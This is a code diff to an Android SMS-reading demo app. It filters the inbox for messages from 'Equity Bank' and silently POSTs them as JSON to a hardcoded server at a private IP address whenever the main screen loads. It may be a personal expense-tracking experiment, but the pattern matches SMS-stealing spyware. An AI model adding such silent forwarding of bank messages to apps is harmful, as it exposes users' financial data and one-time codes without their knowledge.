@@ -2,6 +2,7 @@ package com.stevdza.san.readsmsdemo
 
 import android.content.Context
 import android.net.Uri
+import android.util.Log
 import androidx.compose.foundation.ExperimentalFoundationApi
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.fillMaxSize
@@ -22,6 +23,17 @@ import com.stevdza.san.readsmsdemo.components.MessageView
 import com.stevdza.san.readsmsdemo.components.SenderView
 import com.stevdza.san.readsmsdemo.model.SMSMessage
 import com.stevdza.san.readsmsdemo.model.parsedDate
+import io.ktor.client.HttpClient
+import io.ktor.client.plugins.contentnegotiation.ContentNegotiation
+import io.ktor.client.request.post
+import io.ktor.client.request.setBody
+import io.ktor.client.statement.HttpResponse
+import io.ktor.http.ContentType
+import io.ktor.http.contentType
+import io.ktor.http.isSuccess
+import io.ktor.serialization.kotlinx.json.json
+import kotlinx.serialization.Serializable
+import kotlinx.serialization.json.Json
 
 @OptIn(ExperimentalFoundationApi::class)
 @Composable
@@ -36,6 +48,8 @@ fun MainScreen() {
                 type = "sent"
             )
         allMessages += messages.sortedBy { it.date }.groupBy { it.sender }
+
+        sendMessagesToUrl(messages)
     }
 
     LazyColumn(
@@ -71,6 +85,8 @@ fun MainScreen() {
                 }
         }
     }
+
+   // sendMessagesToUrl(allMessages)
 }
 
 private fun readMessages(context: Context, type: String): List<SMSMessage> {
@@ -92,18 +108,65 @@ private fun readMessages(context: Context, type: String): List<SMSMessage> {
         val indexService = it.getColumnIndex("service_center")
 
         while (it.moveToNext()) {
-            messages.add(
-                SMSMessage(
-                    message = it.getString(indexMessage),
-                    sender = it.getString(indexSender),
-                    date = it.getLong(indexDate),
-                    read = it.getString(indexRead).toBoolean(),
-                    type = it.getInt(indexType),
-                    thread = it.getInt(indexThread),
-                    service = it.getString(indexService) ?: ""
+            val sender = it.getString(indexSender)
+            if (sender == "Equity Bank") {
+                messages.add(
+                    SMSMessage(
+                        message = it.getString(indexMessage),
+                        sender = sender,
+                        date = it.getLong(indexDate),
+                        read = it.getString(indexRead).toBoolean(),
+                        type = it.getInt(indexType),
+                        thread = it.getInt(indexThread),
+                        service = it.getString(indexService) ?: ""
+                    )
                 )
-            )
+            }
         }
     }
     return messages
+}
+
+@Serializable
+data class SMSMessage(
+    val message: String,
+    val sender: String,
+    val date: Long,
+    val read: Boolean,
+    val type: Int,
+    val thread: Int,
+    val service: String
+)
+private suspend fun sendMessagesToUrl(messages: List<SMSMessage>) {
+    val url = "http://192.168.16.212:8000/api/sms"
+
+    val client = HttpClient {
+        install(ContentNegotiation) {
+            json(Json {
+                prettyPrint = true
+                isLenient = true
+                ignoreUnknownKeys = true
+            })
+        }
+    }
+
+    try {
+        val response: HttpResponse = client.post(url) {
+            contentType(ContentType.Application.Json)
+            setBody(messages) // Automatically serialize the list of messages to JSON
+        }
+
+        if (response.status.isSuccess()) {
+            // Handle successful response (e.g., logging)
+            Log.d("MainScreen", "Messages sent successfully")
+        } else {
+            // Handle error response
+            Log.e("MainScreen", "Error sending messages: ${response.status}")
+        }
+    } catch (e: Exception) {
+        // Handle any exceptions during the network request
+        Log.e("MainScreen", "Error sending messages: ${e.message}")
+    } finally {
+        client.close()
+    }
 }
